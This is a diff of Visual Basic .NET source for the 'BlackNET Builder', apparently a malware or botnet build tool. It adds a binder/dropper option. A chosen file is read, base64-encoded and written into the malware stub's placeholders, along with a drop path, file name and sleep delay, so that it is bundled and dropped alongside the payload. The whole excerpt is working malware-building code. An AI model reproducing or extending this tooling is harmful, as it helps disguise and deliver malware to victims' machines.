@@ -5,15 +5,19 @@ Imports Mono.Cecil.Cil
 Imports System.Net
 ' - - - - - - - - - - -
 ' BlackNET Builder
-' v1.5.0
+' v2.0.0.0
 ' Developed by: Black.Hacker
-' Tnx to: NYAN CAT, KFC, NirSoft.
+' Tnx to: NYAN CAT, KFC, Underc0de.
 ' - - - - - - - - - - -
 Public Class Form1
     Dim dialog As New SaveFileDialog
     Dim a As New OpenFileDialog
     Public trd As System.Threading.Thread
     Public st As Integer = 0
+    Public BinderPath As String = ""
+    Public dropPath As String = ""
+    Public dropName As String = ""
+    Public sleep As String = ""
     Public Shared Function getMD5Hash(ByVal B As Byte()) As String
         B = New MD5CryptoServiceProvider().ComputeHash(B)
         Dim str2 As String = ""
@@ -138,6 +142,24 @@ Public Class Form1
                                                 current.Operand = FlatCheckBox10.Checked.ToString
                                             End If
 
+                                            If (str = "[BinderStatus]") Then
+                                                current.Operand = FlatCheckBox12.Checked.ToString
+                                            End If
+
+                                            If FlatCheckBox12.Checked = True Then
+                                                If (str = "[BinderBytes]") Then
+                                                    current.Operand = Convert.ToBase64String(File.ReadAllBytes(BinderPath))
+                                                End If
+                                                If (str = "[DropperPath]") Then
+                                                    current.Operand = dropPath
+                                                End If
+                                                If (str = "[BinderSleep]") Then
+                                                    current.Operand = sleep
+                                                End If
+                                                If (str = "[DropperName]") Then
+                                                    current.Operand = dropName
+                                                End If
+                                            End If
                                         End If
                                     End If
                                 Loop
@@ -282,6 +304,12 @@ Public Class Form1
     Private Sub FlatCheckBox10_CheckedChanged(sender As Object) Handles FlatCheckBox10.CheckedChanged
         If (FlatCheckBox1.Checked = True) Then
             FlatCheckBox1.Checked = False
+        End If
+    End Sub
+
+    Private Sub FlatCheckBox12_CheckedChanged(sender As Object) Handles FlatCheckBox12.CheckedChanged
+        If FlatCheckBox12.Checked = True Then
+            Binder.Show()
         End If
     End Sub
 End Class
